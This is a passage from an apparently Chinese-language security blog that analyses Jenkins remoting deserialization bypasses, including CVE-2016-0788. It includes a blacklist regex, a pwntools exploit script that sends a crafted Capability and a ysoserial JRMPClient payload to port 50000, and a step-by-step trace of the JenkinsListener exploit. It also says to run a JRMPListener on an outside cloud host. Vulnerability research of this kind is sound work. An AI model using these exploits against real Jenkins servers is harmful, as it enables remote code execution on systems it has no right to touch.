copyOnWriteArrayList2);</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceMap</span> <span class="variable">referenceMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceMap</span>();</span><br><span class="line">referenceMap.put(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">referenceMap.put(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;Aluvion&quot;</span>);</span><br><span class="line">Object[] data = (Object[])getFieldValue(referenceMap, <span class="string">&quot;data&quot;</span>);</span><br><span class="line">setField(data[<span class="number">1</span>], <span class="string">&quot;key&quot;</span>, copyOnWriteArraySet1);</span><br><span class="line">setField(data[<span class="number">7</span>], <span class="string">&quot;key&quot;</span>, copyOnWriteArraySet2);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] poc = serialize(referenceMap);</span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(poc)));</span><br><span class="line">unserialize(poc);</span><br></pre></td></tr></table></figure>

<p>使用反射还是要麻烦一些的，不过也容易理解一些，然后再仿照 payload 整个 python 脚本就行了。顺带一提，给出的 payload 里面的序列化 Capability 对象好像有点问题，可以自己改一下它的 mask 属性，修改后的 Capability 对象如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preamble = <span class="string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span> \</span><br><span class="line">           <span class="string">&quot;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>将 SignedObject 加入黑名单。</p>
<h3 id="CVE-2016-0788"><a href="#CVE-2016-0788" class="headerlink" title="CVE-2016-0788"></a>CVE-2016-0788</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull jenkins:1.642.1</span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>跟 CVE-2017-1000353 一样都是 CVE-2015-8103 的绕过，触发点也相同，不过这里走的不是 HTTP 途径，而且用的是 JRMP 方式，1.642.1 版本下的黑名单如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassFilter</span>.RegExpClassFilter(Arrays.asList(Pattern.compile(<span class="string">&quot;^org\\.codehaus\\.groovy\\.runtime\\..*&quot;</span>), Pattern.compile(<span class="string">&quot;^org\\.apache\\.commons\\.collections\\.functors\\..*&quot;</span>), Pattern.compile(<span class="string">&quot;.*org\\.apache\\.xalan.*&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>没有禁止 JRMP，所以可以通过反序列化创建一个 JRMP Client 连接我们的 Sever，返回 commons-collections 的序列化攻击链实现攻击。（当然反过来用 JRMP Listener 也是可以的）</p>
<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>ysoerial 中就有这个漏洞的利用代码，可以读一下。</p>
<h5 id="JenkinsReverse"><a href="#JenkinsReverse" class="headerlink" title="JenkinsReverse"></a>JenkinsReverse</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">target = remote(<span class="string">&quot;172.17.0.2&quot;</span>, <span class="number">50000</span>)</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;Protocol:CLI-connect&quot;</span></span><br><span class="line">target.send(<span class="string">&quot;\x00&quot;</span> + <span class="built_in">chr</span>(<span class="built_in">len</span>(protocol)) + protocol)</span><br><span class="line">target.recv()</span><br><span class="line">pause()</span><br><span class="line">capability = <span class="string">&quot;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=&quot;</span></span><br><span class="line">target.send(<span class="string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span>)</span><br><span class="line">target.send(capability)</span><br><span class="line">pause()</span><br><span class="line">target.send(<span class="string">&quot;\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">JRMPClient = base64.b64decode(<span class="string">&quot;JRMPClient payload from ysoserial&quot;</span>)</span><br><span class="line">target.send(JRMPClient)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure>

<p>然后在云主机之类的地方用 ysoserial 开个 JRMPListener 即可。</p>
<h5 id="JenkinsListener"><a href="#JenkinsListener" class="headerlink" title="JenkinsListener"></a>JenkinsListener</h5><p>这种方式就比较复杂了，主要分为三步，每次传输的都是一段序列化数据，然后触发服务端相应的处理，第一步的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetSocketAddress</span> <span class="variable">isa</span> <span class="operator">=</span> JenkinsCLI.getCliPort(jenkinsUrl);</span><br><span class="line">c = JenkinsCLI.openChannel(isa);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">call</span> <span class="operator">=</span> c.call( JenkinsCLI.getPropertyCallable(JarLoader.class.getName() + <span class="string">&quot;.ours&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>getPropertyCallable 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Callable&lt;?, ?&gt; getPropertyCallable ( <span class="keyword">final</span> Object prop )</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    Class&lt;?&gt; reqClass = Class.forName(<span class="string">&quot;hudson.remoting.RemoteInvocationHandler$RPCRequest&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; reqCons = reqClass.getDeclaredConstructor(<span class="type">int</span>.class, Method.class, Object[].class);</span><br><span class="line">    Reflections.setAccessible(reqCons);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">getJarLoader</span> <span class="operator">=</span> reqCons</span><br><span class="line">        .newInstance(<span class="number">1</span>, Class.forName(<span class="string">&quot;hudson.remoting.IChannel&quot;</span>).getMethod(<span class="string">&quot;getProperty&quot;</span>, Object.class), <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            prop</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="keyword">return</span> (Callable&lt;?, ?&gt;) getJarLoader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单来说就是一个 RPCRequest 类，它是 Command 类的子类，其构造函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RPCRequest</span><span class="params">(<span class="type">int</span> oid, Method m, Object[] arguments, ClassLoader cl)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.oid = oid;</span><br><span class="line">    <span class="built_in">this</span>.arguments = arguments;</span><br><span class="line">    <span class="built_in">this</span>.methodName = m.getName();</span><br><span class="line">    <span class="built_in">this</span>.classLoader = cl;</span><br><span class="line">    <span class="built_in">this</span>.types = <span class="keyword">new</span> <span class="title class_">String</span>[arguments.length];</span><br><span class="line">    Class&lt;?&gt;[] params = m.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arguments.length; ++i) &#123;</span><br><span class="line">        <span class="built_in">this</span>.types[i] = params[i].getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">this</span>.types.length == arguments.length;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以该对象中的 oid 属性为 1，methodName 属性为 getProperty，arguments 属性为 JarLoader.ours。然后到了服务端那边：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    cmd = SynchronousCommandTransport.<span class="built_in">this</span>.read();</span><br><span class="line">&#125; <span class="keyword">catch</span> (EOFException var23) &#123;</span><br><span class="line">    <span class="type">IOException</span> <span class="variable">ioe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unexpected termination of the channel&quot;</span>);</span><br><span class="line">    ioe.initCause(var23);</span><br><span class="line">    <span class="keyword">throw</span> ioe;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException var24) &#123;</span><br><span class="line">    SynchronousCommandTransport.LOGGER.log(Level.SEVERE, <span class="string">&quot;Unable to read a command (channel &quot;</span> + name + <span class="string">&quot;)&quot;</span>, var24);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ++<span class="built_in">this</span>.commandsReceived;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.receiver.handle(cmd);</span><br></pre></td></tr></table></figure>

<p>反序列化出 RPCRequest 对象后，会调用 handler：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(Command cmd)</span> &#123;</span><br><span class="line">    Channel.<span class="built_in">this</span>.updateLastHeard();</span><br><span class="line">    <span class="keyword">if</span> (Channel.logger.isLoggable(Level.FINE)) &#123;</span><br><span class="line">        Channel.logger.fine(<span class="string">&quot;Received &quot;</span> + cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        cmd.execute(Channel.<span class="built_in">this</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后调用 RPCRequest 的 execute，关键的三行代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">channel.pipeWriter.get(Request.<span class="built_in">this</span>.lastIoId).get();</span><br><span class="line"><span class="type">RSP</span> <span class="variable">r</span> <span class="operator">=</span> Request.<span class="built_in">this</span>.perform(channel);</span><br><span class="line">rsp = <span class="keyword">new</span> <span class="title class_">Response</span>(Request.<span class="built_in">this</span>.id, <span class="built_in">this</span>.calcLastIoId(), r);</span><br></pre></td></tr></table></figure>

<p>通过 perform 进行处理，然后将 Response 写入相应，perform 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Serializable <span class="title function_">perform</span><span class="params">(Channel channel)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> channel.getExportedObject(<span class="built_in">this</span>.oid);</span><br><span class="line">    Class[] clazz = channel.getExportedTypes(<span class="built_in">this</span>.oid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> <span class="built_in">this</span>.choose(clazz);</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to call &quot;</span> + <span class="built_in">this</span>.methodName + <span class="string">&quot;. No matching method found in &quot;</span> + Arrays.toString(clazz) + <span class="string">&quot; for &quot;</span> + o);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            Object r;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                r = m.invoke(o, <span class="built_in">this</span>.arguments);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemotingSystemException</span>(<span class="string">&quot;failed to invoke &quot;</span> + m + <span class="string">&quot; on &quot;</span> + o + Arrays.toString(<span class="built_in">this</span>.arguments), var7);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (r != <span class="literal">null</span> &amp;&amp; !(r <span class="keyword">instanceof</span> Serializable)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemotingSystemException</span>(<span class="keyword">new</span> <span class="title class_">ClassCastException</span>(r.getClass() + <span class="string">&quot; is returned from &quot;</span> + m + <span class="string">&quot; on &quot;</span> + o.getClass() + <span class="string">&quot; but it&#x27;s not serializable&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Serializable)r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var8.getTargetException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 choose 获取反射函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Method <span class="title function_">choose</span><span class="params">(Class[] interfaces)</span> &#123;</span><br><span class="line">    Class[] arr$ = interfaces;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">        Method[] arr$ = clazz.getMethods();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> arr$.length;</span><br><span class="line"></span><br><span class="line">        label38:</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">            <span class="keyword">if</span> (m.getName().equals(<span class="built_in">this</span>.methodName)) &#123;</span><br><span class="line">                Class&lt;?&gt;[] paramTypes = m.getParameterTypes();</span><br><span class="line">                <span class="keyword">if</span> (paramTypes.length == <span class="built_in">this</span>.arguments.length) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.types.length; ++i) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">this</span>.types[i].equals(paramTypes[i].getName())) &#123;</span><br><span class="line">                            <span class="keyword">continue</span> label38;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> m;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出反射函数来自反射主体所继承的接口，并且要与函数名、参数等数据吻合。</p>
<p>然后就是一个显眼的反射操作，oid、method 都是可以可控制的，需要看一下的就是 channel.getExportedObject（作为反射的主体）和 channel.getExportedTypes（用于获取执行反射操作的函数）获取到的结果，经过调试可以发现，exportedObjects 表中只有一个成员，channel 自身。然后则会调用该 channel 的 getProperty 函数，参数为 JarLoader.ours，同样通过调试可以看到 properties 属性的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;hudson.cli.CliEntryPoint=hudson.cli.CliManagerImpl@405894b7, hudson.remoting.JarLoader.ours=hudson.remoting.JarLoaderImpl@<span class="number">44671864</span>&#125;</span><br></pre></td></tr></table></figure>

<p>所以这一步获取到的实际上是一个 JarLoaderImpl 对象，然后生成 Response：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserResponse</span>(<span class="built_in">this</span>.serialize(r, channel), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>并写入响应：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.send(rsp);</span><br></pre></td></tr></table></figure>

<p>在序列化 JarLoaderImpl 对象的时候，会触发其 writeReplace 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Channel.current().export(JarLoader.class, <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用 channel 的 export 函数将自身放入其 exportedObjects 表中，所以下次交互进行到 perform 函数中的反射时，可以使用 JarLoaderImpl 作为反射主体。</p>
<p>经过处理后，最终返回的是一个 Proxy 对象，其 invocationhandler 中存放着 JarLoaderImpl 对象的 oid（用于表示远程对象的一个数字），调试可得其为 2。</p>
<p>然后进入第二步：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">uro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPListener</span>().getObject(String.valueOf(jrmpPort));</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; reqClass = Class.forName(<span class="string">&quot;hudson.remoting.RemoteInvocationHandler$RPCRequest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> makeIsPresentOnRemoteCallable(oid, uro, reqClass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    c.call((Callable&lt;?, ?&gt;) o);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成一段 JRMPListener payload，然后调用 makeIsPresentOnRemoteCallable：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">makeIsPresentOnRemoteCallable</span> <span class="params">( <span class="type">int</span> oid, Object uro, Class&lt;?&gt; reqClass )</span></span><br><span class="line">    <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException &#123;</span><br><span class="line">    Constructor&lt;?&gt; reqCons = reqClass.getDeclaredConstructor(<span class="type">int</span>.class, Method.class, Object[].class);</span><br><span class="line">    Reflections.setAccessible(reqCons);</span><br><span class="line">    <span class="keyword">return</span> reqCons</span><br><span class="line">        .newInstance(oid, JarLoader.class.getMethod(<span class="string">&quot;isPresentOnRemote&quot;</span>, Class.forName(<span class="string">&quot;hudson.remoting.Checksum&quot;</span>)), <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            uro,</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到生成的同样是一个 RPCRequest 类，这次其 oid 为 2，methodName 为 isPresentOnRemote，arguments 为 JRMPListener payload。这样来到 perform 函数时，就是在 JarLoaderImpl 对象上调用其接口 JarLoader 的 isPresentOnRemote 函数，但是这里有个问题，JarLoader 接口的 isPresentOnRemote 函数是一个抽象函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">isPresentOnRemote</span><span class="params">(Checksum var1)</span>;</span><br></pre></td></tr></table></figure>

<p>于是就会报错并抛出异常：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemotingSystemException</span>(<span class="string">&quot;failed to invoke &quot;</span> + m + <span class="string">&quot; on &quot;</span> + o + Arrays.toString(<span class="built_in">this</span>.arguments), var7);</span><br></pre></td></tr></table></figure>

<p>而上一层则会捕捉异常并将其作为响应：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">    rsp = <span class="keyword">new</span> <span class="title class_">Response</span>(Request.<span class="built_in">this</span>.id, <span class="built_in">this</span>.calcLastIoId(), var18);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>观察报错信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">failed to invoke public abstract boolean hudson.remoting.JarLoader.isPresentOnRemote(hudson.remoting.Checksum) on hudson.remoting.JarLoaderImpl@2cae1e9d[ActivationGroupImpl[UnicastServerRef [liveRef: [endpoint:[172.17.0.2:12345](local),objID:[6c817df0:175f8bef343:-7ffd, 937379779203472170]]]]]</span><br></pre></td></tr></table></figure>

<p>报错会打印出 arguments，也就是 JRMPListener payload，这是一个 ActivationGroupImpl -&gt; UnicastServerRef -&gt; LiveRef 的对象，而在报错打印数据时调用的 LiveRef 的 toString 函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    String var1;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isLocal) &#123;</span><br><span class="line">        var1 = <span class="string">&quot;local&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var1 = <span class="string">&quot;remote&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[endpoint:&quot;</span> + <span class="built_in">this</span>.ep + <span class="string">&quot;(&quot;</span> + var1 + <span class="string">&quot;),&quot;</span> + <span class="string">&quot;objID:&quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会将其中的 objID 打印出来。</p>
<p>接下来就是最后一步了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    c.call((Callable&lt;?, ?&gt;) o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">    <span class="comment">// [ActivationGroupImpl[UnicastServerRef [liveRef:</span></span><br><span class="line">    <span class="comment">// [endpoint:[172.16.20.11:12345](local),objID:[de39d9c:15269e6d8bf:-7fc1,</span></span><br><span class="line">    <span class="comment">// -9046794842107247609]]</span></span><br><span class="line"></span><br><span class="line">    System.err.println(e.getMessage());</span><br><span class="line"></span><br><span class="line">    parseObjIdAndExploit(args, payloadClass, jrmpPort, isa, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行第二步操作并捕捉前面提到的因为调用了抽象函数抛出的异常，然后调用 parseObjIdAndExploit，解析报错信息中的 objID，然后调用 exploit，可以看到 exploit 部分其实跟 JRMPClient 差别不大，不同的地方就在于写入了前面解析出来的 objID，而不是默认的 2。</p>
<p>跟踪一下 JRMPListener 的反序列化过程，看到 Transport 类的 serviceCall 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall var1)</span> 